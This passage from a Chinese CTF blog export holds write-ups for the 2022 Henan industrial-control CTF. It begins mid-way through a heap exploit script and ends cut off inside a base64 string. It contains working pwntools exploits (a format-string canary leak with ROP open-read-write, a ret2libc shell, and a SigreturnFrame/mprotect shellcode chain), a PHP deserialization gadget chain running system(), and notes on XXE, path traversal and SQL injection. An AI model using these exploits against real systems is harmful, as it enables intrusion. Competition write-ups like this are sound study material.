fake_FILE +=p64(fake_addr+0xb0)

 

fake_FILE +=p64(set_context) 

fake_FILE = fake_FILE.ljust(0x58, b&#x27;\x00&#x27;)

fake_FILE += p64(0)  

\# chain

fake_FILE = fake_FILE.ljust(0x78, b&#x27;\x00&#x27;)

fake_FILE += p64(heap_base+0x1000)  

\# lock = a writable address

fake_FILE = fake_FILE.ljust(0x90, b&#x27;\x00&#x27;)

fake_FILE +=p64(fake_addr+0x30)#_wide data 

fake_FILE = fake_FILE.ljust(0xB0, b&#x27;\x00&#x27;)

 

fake_FILE += p64(0)

 

fake_FILE = fake_FILE.ljust(0xC8, b&#x27;\x00&#x27;)

fake_FILE += p64(libc_base+0x1e4f80+0x10)  

 

fake_FILE +=p64(0)*6

fake_FILE += p64(fake_addr+0x50)  

\# rax2_addr

 

edit(2,fake_FILE)

 

shellcode_addr=heap_base+0xee0+0x300

 

frame = SigreturnFrame()

 

frame.rsp = shellcode_addr+0x20

frame.rdi = heap_base

frame.rsi = 0x10000

frame.rdx = 7

frame.rip = libc_base+libc.symbols[&#x27;mprotect&#x27;]

 

code = shellcraft.open(&quot;/flag&quot;)

code += shellcraft.read(&#x27;rax&#x27;,&#x27;rsp&#x27;,0x50)

code += shellcraft.write(1, &#x27;rsp&#x27;, 0x50)

code += shellcraft.exit(0)

shellcode=asm(code)

payload=bytes(frame)[0x20:].ljust(0x300,b&#x27;\x00&#x27;)+p64(shellcode_addr+0x28)+shellcode

edit(3,payload)

 

address.sendlineafter(&quot;choice: &quot;,&#x27;1&#x27;)

address.sendlineafter(&quot;Give me a dream ID: &quot;,str(6))

address.sendlineafter(&quot;how long: &quot;,str(0x4f0))

 

address.interactive()</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026666.png?x-oss-process=hzy" alt="img"></p>
<p>flag{99132165422532108828180523625259}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2022河南工控CTF</title>
    <url>/2022/11/04/2022%E5%B7%A5%E6%8E%A7CTF/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041842203.png?x-oss-process=hzy" alt="image-20221104183502219"></p>
<span id="more"></span>
<h1 id="前言">前言</h1>
<p>初赛成绩学生组第七，复赛成绩学生组第四(因为疫情复赛没有线下举办，挺可惜的，同时在比赛当天学校因疫情紧急封校，条件刻苦，大家一块努力打了一天，这个成绩是我们大家一块努力赢得的，尽管没有进总决赛，但是大家尽力了，下次继续加油！！！)，放个复赛的成绩截图吧(这个截图是全排名)</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835296.png?x-oss-process=hzy" alt="image-20221104183502219"></p>
<h1 id="初赛">初赛</h1>
<h2 id="hngk-工程文件分析">HNGK-工程文件分析</h2>
<p>下载一个压缩包，解压之后执行strings $(find . | xargs) | grep flag{</p>
<p>得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831175.png?x-oss-process=hzy" alt="img"></p>
<p>flag{3u1xaCYSVSK5cJDT}</p>
<h2 id="hngk-xxx">HNGK-xxx</h2>
<p>考察xxe</p>
<p>File协议直接读flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831160.jpg?x-oss-process=hzy" alt="img"></p>
<p>flag{1gggkinjp31rtp028abi4k6356jbfm7d}</p>
<h2 id="hngk-兰亭集序">HNGK-兰亭集序</h2>
<p>目录穿越遍历可以任意文件读取</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831172.png?x-oss-process=hzy" alt="img"></p>
<p>得到提示，直接读fflagggg.php</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831174.png?x-oss-process=hzy" alt="img"></p>
<p>flag{1gggktmmtnbdta028abi4k638fjbfmam}</p>
<h2 id="hngk-s7comm协议分析">HNGK-S7Comm协议分析</h2>
<p>协议分析，过滤一下COTP，追踪TCP流，找到一串编码，追踪tcp流</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831176.jpg?x-oss-process=hzy" alt="img"></p>
<p>hex字符互转得到flag</p>
<p>flag{ktBuC4Lzj3}</p>
<h2 id="hngk-phpgame">HNGK-phpgame</h2>
<p>乱码恢复之后得到php66.php</p>
<p>访问php66.php得到源码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831198.png?x-oss-process=hzy" alt="img"><br>
传参?get={“year”:“x”,“items”:[222,[],0]}满足条件得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831009.png?x-oss-process=hzy" alt="img"></p>
<p>flag{1ggh0092pgbqs3028abi4k63nejbfmpl}</p>
<h2 id="hngk-out">HNGK-out</h2>
<p>Sql注入</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831137.png?x-oss-process=hzy" alt="img"></p>
<p>找到注入点</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831192.png?x-oss-process=hzy" alt="img"></p>
<p>Fuzz发现过滤了空格，并且需要双写绕过and</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831195.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831244.png?x-oss-process=hzy" alt="img"></p>
<p>得到flag</p>
<p>flag{1ggguedosum8i60288b4a0l721dssb0a}</p>
<h2 id="hngk-ds_store">HNGK-DS_Store</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831242.png?x-oss-process=hzy" alt="img"></p>
<p>Base64解码得到mypop.php</p>
<p>反序列化构造利用，///绕过+wakeup绕过命令执行</p>
<p>如下</p>
<pre><code class="hljs plaintext">&lt;?php

 

class Fish&#123;

  public $food;

  public function __construct($flag1)&#123;

​    $this-&gt;food = $flag1;

  &#125;

 

&#125;

 

class Bubble&#123;

  public $bubble;

  public $hack;

  public function __construct()&#123;

​    

​    $this-&gt;hack = &#x27;system(&quot;ls&quot;);&#x27;;

​    

  &#125;

 

&#125;

 

class Turtle&#123;

  public $head;

  public $tail;

  public function __construct($flag2)&#123;

​    $this-&gt;tail = $flag2;

  &#125;

  

&#125;

 

class Stone&#123;

  public $rock;

  public $ash;

  public function __construct($flag)&#123;

​    $this-&gt;rock = $flag;

  &#125;

 

&#125;

 

$huang = new Bubble();

$ll = new Fish($huang);

$f = new Turtle($ll);

$flag = new Stone($f);

 

echo serialize($flag);

 

?&gt;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831002.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831004.png?x-oss-process=hzy" alt="img"></p>
<p>flag{1gghl70plj1mi1028abi4k63rgjbfmtn}</p>
<h2 id="hngk-easy_wincc">HNGK-easy_wincc</h2>
<p>一堆文件夹，直接使用破空flag关键字搜索得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831211.png?x-oss-process=hzy" alt="img"></p>
<p>flag{wincc_1s_1nteresting~}</p>
<h2 id="hngk-签到">HNGK-签到</h2>
<p>ida64位打开分析</p>
<p><strong><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831226.png?x-oss-process=hzy" alt="img"></strong></p>
<p>跟进cewwe23rf</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831228.png?x-oss-process=hzy" alt="img"></p>
<p>得出：a2[this[i]-48]=a3[i]</p>
<p>分析v5，v7，v8</p>
<p>得出v7</p>
<pre><code class="hljs plaintext">‘’‘

a=&#x27;OFG&#123;OxS3Lha6MUDk[0PnXofmcUrp`E3w`1@zalL2fZX1gJn4SWHFPGTEP2jHQivOVW7RWDDQW3PTTnf[UTmjSAOiHT6oIkerZ&#123;q?&#x27;
 b=[0 for i in range(len(a))]
 for i in range(len(a)):
   b[i]=ord(a[i])^2
   print(chr(b[i]),end=&#x27;&#x27;)

‘‘’</code></pre>
<p>V8</p>
<p>‘’‘</p>
<pre><code class="hljs plaintext">a=&#x27;bEBn`GBkMV&#123;fJyMLTF&#123;yR@sQVjUNIoULJVtsN@UQ[d&gt;&gt;&#x27;
b=[0 for i in range(len(a))]
for i in range(len(a)):
    b[i]=ord(a[i])^3
    print(chr(b[i]),end=&#x27;&#x27;)</code></pre>
<p>‘‘’</p>
<p>结果再base64解码</p>
<p>脚本如下：</p>
<p>‘’‘</p>
<pre><code class="hljs plaintext">a=&#x27;hP&amp;p0!5L^#3NXLs@*QR%L&amp;UN!L)0%Q^&#x27;
b=&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&amp;*()_+&#x27;
for i in range(len(a)):
    c=b.find(a[i])
    print(chr(c+48),end=&#x27;&#x27;)</code></pre>
<p>‘‘’</p>
<p>flag{ActI0n5_sp3ak_Louder_than_w0rds}</p>
<h2 id="hngk-反调试">HNGK-反调试</h2>
<p>Ida32位打开</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831240.jpg?x-oss-process=hzy" alt="img"></p>
<p>Tls反调试</p>
<pre><code class="hljs plaintext">调试得到dowrd_41A040=[0x176,0x39e,0x293,0x3fd,0x11d,0x91,0x229,0x50,0x1f9,0x171,0x12b,0x2ec,0x300,0x8d,0x3fd,0x171,0xd1,0x8d,0xd6,0x50,0x171,0x104,0x219,0x21
]</code></pre>
<p>脚本如下：</p>
<p>‘’’</p>
<pre><code class="hljs plaintext">a=[0x176,0x39e,0x293,0x3fd,0x11d,0x91,0x229,0x50,0x1f9,0x171,0x12b,0x2ec,0x300,0x8d,0x3fd,0x171,0xd1,0x8d,0xd6,0x50,0x171,0x104,0x219,0x21]
print(len(a))
for i in range(0,23):
    for j in range(0,127):
        if (a[i] * j % 1031 == 1):
            print(chr(j), end=&#x27;&#x27;)</code></pre>
<p>‘’’</p>
<p>flag{@nt1_d3bug_Ju5t_s0}</p>
<h2 id="hngk-py字节码">HNGK-py字节码</h2>
<p>附件给的是个字节码</p>
<p>分析能得到以下代码</p>
<p><strong><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831970.png?x-oss-process=hzy" alt="img"></strong></p>
<p>分析并计算得到seed=22</p>
<p>‘‘’</p>
<pre><code class="hljs plaintext">a = 17
b = 13
def rand():
    global seed
    seed = (a*seed+b) % 128
    return seed
seed = 22
enc = [102, 3, 46, 0, 78, 102, 103, 57, 116, 63, 110, 127, 121, 59, 57, 33, 49, 11, 110, 18, 6]
data = [102, 50, 35, 35, 35, 17, 67, 35, 69, 35, 51, 34, 35, 69, 35, 69, 35, 51, 34, 35, 153]
flag = [0]*20
for i in range(20):
    data[i+1] = data[i] ^ i ^(rand() % 128)
    flag[i] = enc[i+1] ^ data[i+1]
    data[i+1] = enc[i+1]
print(bytes(flag))</code></pre>
<p>‘’‘</p>
<p>flag{Pyth0n_1s_yyds}</p>
<h2 id="hngk-数独">HNGK-数独</h2>
<p>32位ida打开分析</p>
<p><strong><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831974.png?x-oss-process=hzy" alt="img"></strong></p>
<p><strong>发现迷宫</strong></p>
<p><strong><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831976.png?x-oss-process=hzy" alt="img"></strong></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831068.png?x-oss-process=hzy" alt="img"></p>
<p>这里运行会转到SHE</p>
<p>脚本如下：</p>
<p>‘‘’</p>
<pre><code class="hljs plaintext">w = &quot;&#123;hXxAjYkacX+8&gt;h#&lt;Z9g&lt;dqAQNxZp4Ccq3QLjorvP+Ox3oPOBiHD5r;gHuRa@yIfmO2=K9brZMeO6Qz2K&quot;
m = &quot;5619238183457621978469254539786692871328563671281793452&quot;
c = 0
for i in range(len(m)):
    a = ord(m[i])-48
    b = w[c*9+a-1]
    c = (c+1)%9
    print(b,end=&#x27;&#x27;)</code></pre>
<p>‘’‘</p>
<p>Ah9LoOyf2X8q3+P;rzk8ALoiu=ea#Nq+rgbz{+gQPHHKz{XNZOrH26h</p>
<h2 id="hngk-easystack">HNGK-easystack</h2>
<p>分析附件存在格式化字符串漏洞和栈溢出</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831072.png?x-oss-process=hzy" alt="img"></p>
<p>Canary保护</p>
<p>分析附件</p>
<p>脚本如下：</p>
<pre><code class="hljs plaintext">‘’‘

from pwn import *

context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)

\#r = process(&#x27;./sta&#x27;)

r = remote(&#x27;47.92.27.98&#x27;, &#x27;26421&#x27;)

elf = ELF(&#x27;./sta&#x27;)

libc = elf.libc

libc = ELF(&#x27;./libc-2.31.so&#x27;)

 

puts_plt = elf.plt[&#x27;puts&#x27;]

puts_got = elf.got[&#x27;puts&#x27;]

main = 0x401511

bss_seg = 0x404080

pop_rdi_ret = 0x401653

def m(cc,payload=&#x27;&#x27;):

  r.sendlineafter(&quot;&gt;&gt; &quot;,str(cc))

  if cc == 1:

​    r.send(payload)

 

def ln():

  payload = b&#x27;%4660c%7$n&#x27;

  r.sendlineafter(&quot;Please input: &quot;,payload)

ln()

payload1 = b&#x27;a&#x27;*0x68+b&#x27;b&#x27;

m(1,payload1)

m(2)

r.recvuntil(b&#x27;b&#x27;)

canary = u64(r.recv(7).rjust(8,b&#x27;\x00&#x27;))

payload = b&#x27;c&#x27;*0x68+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)

m(1,payload)

m(3)

puts_addr = u64(r.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))

libc_base = puts_addr-libc.sym[&#x27;puts&#x27;]

o = libc_base+libc.sym[&#x27;open&#x27;]

rr = libc_base+libc.sym[&#x27;read&#x27;]

w = libc_base+libc.sym[&#x27;write&#x27;]

pop_rdi_ret = libc_base+0x23b6a

pop_rsi_ret = libc_base+0x2601f

pop_rdx_ret = libc_base+0x142c92

orw1 = b&#x27;c&#x27;*0x68+p64(canary)+p64(0)

orw1 += p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_ret)+p64(bss_seg+0x100)+p64(pop_rdx_ret)+p64(0x100)+p64(rr)+p64(main)

ln()

m(1,orw1)

m(3)

r.send(&quot;./flag&quot;)

 

print(&quot;open!&quot;)

orw2 = b&#x27;c&#x27;*0x68+p64(canary)+p64(0)

orw2 += p64(pop_rdi_ret)+p64(bss_seg+0x100)+p64(pop_rsi_ret)+p64(0)+p64(o)+p64(main)

ln()

m(1,orw2)

\#gdb.attach(r)

\#pause()

m(3)

 

print(&quot;read!&quot;)

orw3 = b&#x27;c&#x27;*0x68+p64(canary)+p64(0)

orw3 += p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_ret)+p64(bss_seg+0x200)+p64(pop_rdx_ret)+p64(0x100)+p64(rr)+p64(main)

ln()

m(1,orw3)

m(3)

print(&quot;write!&quot;)

orw4 = b&#x27;c&#x27;*0x68+p64(canary)+p64(0)

orw4 += p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_ret)+p64(bss_seg+0x200)+p64(pop_rdx_ret)+p64(0x100)+p64(w)+p64(main)

ln()

m(1,orw4)

\#gdb.attach(r)

\#pause()

m(3)

success(hex(canary))

success(hex(libc_base))

r.interactive()

‘‘’</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831141.png?x-oss-process=hzy" alt="img"></p>
<h2 id="hngk-easybaby">HNGK-easybaby</h2>
<p>栈溢出漏洞retlibc</p>
<p>保护</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831797.png?x-oss-process=hzy" alt="img"></p>
<p>‘’‘</p>
<pre><code class="hljs plaintext">from pwn import *
context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)
#r = process(&#x27;./babygame&#x27;)
r = remote(&#x27;47.92.207.120&#x27;,&#x27;24037&#x27;)
elf = ELF(&#x27;./babygame&#x27;)
libc = ELF(&#x27;./libc-2.31.so&#x27;)

bss_seg = 0x405100
puts_plt = elf.plt[&#x27;puts&#x27;]
puts_got = elf.got[&#x27;puts&#x27;]
read_got = elf.got[&#x27;read&#x27;]
ret = 0x401505
pop_rdi_ret = 0x402c33
pop_rsi_r15_ret = 0x402c31
gadget_overflow = 0x4014BB
def one():
    r.sendlineafter(&quot;请输入你的选择：\n&quot;,str(3))
    r.sendlineafter(&quot;2、逃跑\n&quot;,str(1))

def two():
    r.sendlineafter(&quot;请输入你的选择：\n&quot;,str(4))
    for i in range(23):
        r.sendlineafter(&quot;2、逃跑\n&quot;,str(1))
def up():
    r.sendlineafter(&quot;请输入你的选择：\n&quot;,str(1))
    r.sendlineafter(&quot;7、离开武器店\n&quot;,str(4))
    r.sendline(str(7))

for i in range(40):
    one()
up()
for i in range(40):
    one()
up()
for i in range(40):
    one()
up()
two()

payload = b&#x27;a&#x27;*0x30+p64(bss_seg+0x800)+p64(pop_rdi_ret)+p64(read_got)+p64(puts_plt)+p64(0x000000000401190)
r.sendlineafter(&quot;好汉，留下你的姓名\n&quot;,payload)
puts_addr = u64(r.recv(6).ljust(8,b&#x27;\x00&#x27;))
libc_base = puts_addr-libc.sym[&#x27;read&#x27;]
system = libc_base+libc.sym[&#x27;system&#x27;]
sh = libc_base+0x1B45BD
success(hex(puts_addr))
success(hex(libc_base))

r.sendline(str(6))
gadget1 = 0x0000000000402C2A
gadget2 = 0x0000000000402C10
payload2  = b&#x27;b&#x27;*0x28+p64(system)+p64(bss_seg+0x800)
payload2 += p64(pop_rdi_ret)+p64(sh)+p64(ret)+p64(system)
r.sendlineafter(&quot;好汉，留下你的姓名\n&quot;,payload2)
r.interactive()</code></pre>
<p>‘‘‘</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041831808.png?x-oss-process=hzy" alt="img"></p>
<h1 id="复赛">复赛</h1>
<h2 id="hngk-流量分析">HNGK-流量分析</h2>
<p>直接使用grep全局搜.png发现base64加密的内容</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835538.png?x-oss-process=hzy" alt="img"></p>
<p>提取出来用脚本转一下图片</p>
<pre><code class="hljs plaintext">import os

import base64

str = &#x27;iVBORw0KGgoAAAANSUhEUgAAAdAAAABiCAYAAADgKILKAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAABzXSURBVHhe7Z2Js11Fncfn75maqZmaqZkaS0elXAp1GHRUhGFAQHYQFQRFBWQRiBoBWQyyKaBsxo0tCAgkQHayQEL2jSxAyEoSIAHOvM/JPTPn9fv1Od19+9z3bvh+qr5FkXe77z33ntO/7l//fr/+m0IIIYQQ0ciACiGEEAnIgAohhBAJyIAKIYQQCciACiGEEAnIgAohhBAJyIAKIYQQCciACiGEEAnIgAohhBAJyIAKIYQQCciACiGEEAnIgAohhBAJyIAKIYQQCciACiGEEAnIgAohhBAJyIAKIYQQCciACiGEEAnIgAohhBAJyIAKIYQQCciACiGEEAnIgAohhBAJyIAKIYQQCciACiGEEAnIgAohhBAJyIAKIYQQCciACiGEEAnIgAohhBAJyIAKIYQQCciACiGEEAl0ZkDff78oNm/ZV8xfuK2Y8fxrxex5W4vlK3cVe/Ye6L1CCCGEGF6yGtC33n63uOPuNcW/fHJG8bcffsarf/3UjNLAVtz/h/Xm6/h3IYQQYiKSzYBufePt4thT55qG0NXxp8/ttTqIDGj/vP3Oe+VKf/L1y4qTzppffOq/ni/+6bDpxY+ve7n3irHw/VrKzdsjE6tFL24v7p26rrhs0pLy8x3+pZnFhz/zbDnZ+th/PFd86auzi3MuWFhcc+Py4qFpG4s1694cNcmKYf/+94oXFm4rbr1zdXHe9xcVn/+fWcVHPvv/7/WVk+YU371kcXHbyN9nzd1a7JVXRHxAeGdknFi2Ylfx+FNbiql/3lA8MPK8/+XJzcXLy3eWz80wcdxpc4t//sSMciw55Zz5xXW/WF4+zwcODO46shhQBqCjvzbHNIKWfnjVS72WB2HQtl7XxWB+KDJz9tbiM1+eaX6HTQbUej3KxZKXdxRXTV5aehys92kThm/u/Dd6vbXD9sDd960tPvH558z+fGKicfmPl5RGW4hBsnDx9lGT10q5YTuNyemHDn/WfAYQk8xf3LqyeGPb271W3bLl1X2l0bP01PRXe6/ygwG1ruOLx88uFr+0o/eqbsliQPlhrAvxiZVBHW4Y63Vd3EiHGtOe2Gx+d5XGw4CuWLWrOPv8BWbfsXp25uu9XptZMDIQ+SYRoXrksU293oToFp6Rc7+3yLwPUS7ee+/94r6p64t//Ph0830sYWSffGZLr4duwLt0wcWLzfdHGNE2fAYU/f1HpxezR1ajXdO3Ad24aW/xdx+xL+LIY2cV0597rdj95v7yh9y9e3/pysOFUEcGNA1mcKyerO/us0fNLF2iv/vjht6rx2K1Q6ngAvrlHau890OKdu3a3+vdz2NPbs7ynq++tq/XoxDd8MrGvaUHzrr/6srBu+++X1w5eanZf4gwvF2BXbDes1KIAWXhdta3FxSHHWl7nNiueXNP+/jRD30b0Ft+tcr88J/7ysxi+/YwV4AMaBpTbls55js75uQ5xcpVu3uvaMZtWymFnbveKc449wWzv1SxV9rG3BfeyGI8+d6E6IrXt75VDvisjKz7z1UOMEJW3zF68un8K9E9ew6U+5bW+1UKMaAVrGbJ9vj0F58f088fH3ql96pu6NuAEvzhfmjEDCMUGdA08PXXv69/+Nj0cq8jlHrbumLZsfOdoD3wE8+cV9zzwLrS3cpqjz1LghrwUODJwBiyh0lAAK8norsJ2n3yC2Mfmkpfv2BBOQDQ9959B8pgph073iknGLi+L5+05P/2Z2+/a/S2ghA52LV7f3Hrr1eXwS7u/dmkfmla4bG4mfqnDaU3kBiDm+9YVfzbp+3Px/OBpysnN94yduLvKsaAVry4ZMeYfggi7JK+DCgrTPcDo3//3LNRkVAyoPGQMuR+X0SWxuC2rxQDRunkrx80eD5d+MPFwaviig0b9xSbNu/t/Z/NXfesNd+P/Z6/PtMehAAYcaIRyVEWIjd4Uax7tE39wGTRWo0hDIqVi8/E252QVyJyPhfs/YZ4jFIMKBBhX++HbIQu6cuAWhYfff/yF3uvCEMGNB5r8tK2YnNx21eK4Wc3LDP7QAQjPPNsuCciBvbUfYMEq0shJgKkSln36FfPmFemWvk8eP1wz+/WmX1iXDCuPja8sse7Ul67vv8IdfZk8ULV+/3a2fPNgMNUA0o0fb0fvHJd0pcBfXrGq6M+bCVcFjHIgMaDa8j9vnhwYnDbVwpl/oJtZnvExv7qtXGrzhhWrdltvu9RJ85Jzh8VIjdLl+0cdX/iPmVbgQkg5DagBPL5tjVw2bbx69+uMdv+fMqK3ivSYT/S7Ze8zRMco4pSDShZB/V+cEF3SV8G9M+PbBz1YSs1RX5ayIDGw2zO/b64+WNw21cK4cDI+2OsrPa4UEnM7hLC7K33nnL7qt4rhBh/eE7JSybHkqIFbHnUyW1AMUhWf6d/64XeK5ohnoFVm9uez99PoQVyS90cVAwnk13yvev/jlINKC7qej9HHD2r95du6MuAYijrH7ZSbOSTDGgargvzhl/GzRLrbesKgT1Gqy2i4lDXsG9pvTdBSkJMJJ6f/bo3HSu3AaVwidXfE0+FR9N+77IXzT4I/kvFSt2ZOedgnqaVhpJqQL98wujv89RvhE0cUunLgPoM33gaUGY0zHZwV7BKeXBklcznmfb45jLijIiyrlx89EvEJxFwvx8Z4Pn8vO9LS3eU0aa5YVZZ/75+ct2y3l/CqLetKwRfcASBCIMoCeYzoKkP3kSHqGXuK6InmaCwz4sbO/Re5jdZ8vLO8n4kv4/VEFswg8h95d4nXuLhaZvKz86zwUqJKOpQSAOhqMYfHnyl7IPnmmozuZ8rVmDsTfL9Mm48+OjG8n2pUoXXJTc5DShuYcsYEbQTkk9dQUERtw/0q9/EebgqGHfdvtj7rO5dKwI45TmmPzcv/uIfja56l5soA9qW/Nqm8y+yQ4r7NaC4SbjpybOigIDVV124DNgvzJVki1uGh833MCDqvhIuTjGJihtuXjHmdTGRtKRh1Nte/TN/1SGLetu62li3/k2zHaKowSDwrYBx2XQx0HXBFT8Zu1pwXdBMBM88z1/VicCQ52b5qzVhELjvcMFZ7REFN2Jd7gScWH3VB2qiPUkP8r03rn6eWT6jBQMi1WRO+6Y/v5iI/7vvXVtGpaeC4SHYrS2PGRckv9mCRduCJy5t5DSg6zfYvwmBOzGsWWs/39wnsfC7UFDH7Yu8zQqrGEyKASUX3e2HMbZLht6AMpD6wq/bxN5ETK1VC2bW1g3iEwnEhHKDVSWEKLJQ3A1zSoPFUG9bVxusAKx2zCT37UsfyGJoMuKscIYBCv+7n33StQcnQUwKb7q1PV+uEgNFFZhSwRGCHz8irC4wq5SY2AVWrlY/m7YcTD1atXp3OZmxXuOKZ8KtQ0x97ZCKPZX++5S55So1ltdef2uMJydE/Y4bFTkNqC+oM9aI4K2wCj6wCIidODCBcvv5xncWjurH/TtKMaBECrv9dL2lM/QGlFJOVttQMXBwXSlwikFoZZG6uBEp6fUdoxYkM/JQfvrz0QMwq5EY6m3raoOZqNXu0qvz5Yu1wQPomzjxm3RRQSU37Fm7n52cWa4NQ+r+rU31IDK2L1IqNBEYGML2HWNn+4h8WlYw3OPW330iX68qYk6lGlx81uuahDGKcQuTZ+xLhWoSK6amdJAYchpQ0tisvnCdx+LuJVaKKTS/bmRF7AYk4XVg7KtT/3ulFAPKqtbthzG6S4begOI6tdoiaiFWx3pZf69E7pP7o7bhm+2FigHCzYlClEYMxR2Aud4Y6m3ragL3qC9X7NHHB1uMnYHB+hyVmGCQ7jNR4VAF9zMT9MD+nvvvIcJgYrzwiqRM7JA1wFlg5Kz2jBExHpm6LrnypXIVzThh/T1E1Qq+DfZOWbVafSC+P8YOa3+OIJtc5DSgbg5kJba3Yvn2D+zfYLlTx9wHv6O1uMHd7uK+BqUYUCbNbj9UN+uSKAOK24xSa5V8pwnw7/XXVfJV+O/HgFauJAYPfvRH/rKp/Jz1QBZ+TGZDFDq3QrRRzEPB/k/ToeHlHusD68o8SQKIOJqHmztkUIspKefOOOk/hnrbupogSMpqgyrX9KCg2pWVQ1YXkwoCZnKtGHJCUIb7edkvdI9/I9Gc54frwO3fNCHEq/Gfx4w2YASWXHvT8jIAiepNbV6bkMozb701thIWcmuc1t+b+7XJaCGrMAclGRl46QMPTZtbmue/jT89bE+8Mf4cD8j5uhU7RlbbRNJi4BlnHv9rvlVNTgPq2ysO+T5cJl1je0CqyNk2iIVw25L2ZgV9ua9DKQbUWkwRaNclUQbUpR/DV6fffu4cGRTayr5VEADgM2QhdWRxrzUFdWAAfVGoFBawcp7qiol0w0jX27IyjKHetq4mLDdJpXqA1KBgzy1kn49gE77b0AMOBgFG0fqslTiejdWkC9fsy8F1xfmOGDsX9vB89U95PnDRNsE9brWtC8PpTlyYzLr3rU8YMyKHXVj9XnSFf3+Ua27DLfmGcDtvfaP5/iBQJ+d9ntOA+rY0tiXc89ZBFYiDuNsgmMd6Jq17GdzXoRQDykH8bj8p++IxHBIGNJbrp4zde0KEyLcxZ97YkOxKv7m/fcOaoIWmA58ZVENxb3Iexhjqbetqgnwyqw0r8tgAg1ysXL07+BBtJhl8bzzk481vR+4X6zMiBqCmCR21gnG3Wm0rtZV2nPG8f0umbaDElW+1q9RmxHwrnEq4T5sGPwy4z/tAtZ+me9FXwzsm/iAXOQ2oL9o5JbDPV5GIlXsbbnAjYjvFh/talGJArSISXR+S/4E0oOSPWe+Hi6YN394AbjE3CtKHzwghBtUQeC93o59BKYZ627qa8O05E4wxnpDfG1O4mxUpe7bjZfTBd9+jEDehNVBVOvbUuWUkbxNcu+8ggBBjYrVDIbnATA6stpVCAvvY37Laoibjy1aD1SZm8pqLnAbUF5vQ9ltY+LwjuNGbYJXptmFy2xSL4L4epRhQApzcfrqOyP9AGlD2NKz3a4tixRVitUNLXrbdExbs3VkJzyjkmjGeVgCKz0Xiw21fqQnfb4VrerxhoCC/1zeQWOLgA+t0ikHg+y4ZcEJOMyJH0mqPQgvq+yZE7Ke1YbVDoZG8FFS32uO6DpmMsgpmImT10RQ4w8lAVhtfkGOX5DSgVj8oZZJ4/+/jx2SeP+tYw7aTkdzXoxQDCq5rn/sDD1VXfCANKAEC1vuRKN2EFeWFMLyxN+mPfmqX3PJdMwMKqxL28aybNLaMH7h9VGrCVwGIQW+iwD4Wbvq26OtKDOTj4dL13ffcGyGw6rbao9AzHH2rsZDf02qHQiPa3TSsSjEVtS681C471+SCZg/TaoOowjNIchpQX9pSzNGSFd4VaMOKzjoFhtq0bWOj2walGlA8D9y79b4IHMW7yGQxNIo4lEPWgPJFUl2ElRqrjONPn1u6GZuiZ1ETnEhgtYk9fQYIfLL68l0zszvr9axWSHtImWVa/aEmrI161Db5GA/wNOASD9kfJX2kydVFdDe/TayaKvzwd+uzWKH+Fr6JIAqtxkTlIKt9yCkWVjsUWl7P9wyEbmOAL9ilba/uWxfaucyIil5twUS5yGlAfWNbPaI4FF9Oqe97xSXven74/5DAzHqbSqkGFPjtyHqwJhT99GtxSBlQSvMxy/C5hkLUhC/8n1qZscRes2VACTShtmnTwN+E21+lJkjJs